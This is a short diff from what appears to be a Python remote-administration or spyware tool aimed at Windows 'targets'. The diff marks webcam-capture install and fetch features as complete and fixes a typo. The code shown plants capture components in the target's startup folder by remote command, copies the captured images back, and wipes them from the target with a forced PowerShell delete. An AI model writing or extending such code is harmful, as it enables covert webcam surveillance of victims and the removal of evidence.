@@ -48,8 +48,8 @@ options_menu = """
                 [6]  remote upload 
                 [7]  restart target
                 [8]  shutdown target
-                [9]  Install Webcam Capture [Partially Done]
-                [10] Fetch Webcam Capture [Not Implemented]
+                [9]  Install Webcam Capture
+                [10] Fetch Webcam Capture
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -196,7 +196,7 @@ def install_camcap(ipv4,pword,temp_dir,startup_dir):
     remote_command(ipv4,pword,camcap_download)
     remote_command(ipv4,pword,webcam_download)
     remote_command(ipv4,pword,controller_command)
-    print("\n[*] Downloaded completed...")
+    print("\n[*] Download completed...")
     print("[*] Restart target host to execute...")
 
 def fetch_camcapture(ipv4,pword,temp_dir,uname):
@@ -211,7 +211,7 @@ def fetch_camcapture(ipv4,pword,temp_dir,uname):
     os.system(f"mv ~/Downloads/QKlYTmHhCDy/* ~/Downloads/{camcap_folder}")
     os.system("rm -rf ~/Downloads/QKlYTmHhCDy")
     print(f"[*] Saved at \"~/Downloads/{camcap_folder}\" folder")
-    
+
     print("[+] Deleting all captures from remote target....")
     remote_command(ipv4,pword, f"powershell remove-item -path {temp_dir}/QKlYTmHhCDy/*.bmp -force -recurse")
     print("[*] Success. Wiped all captures...")
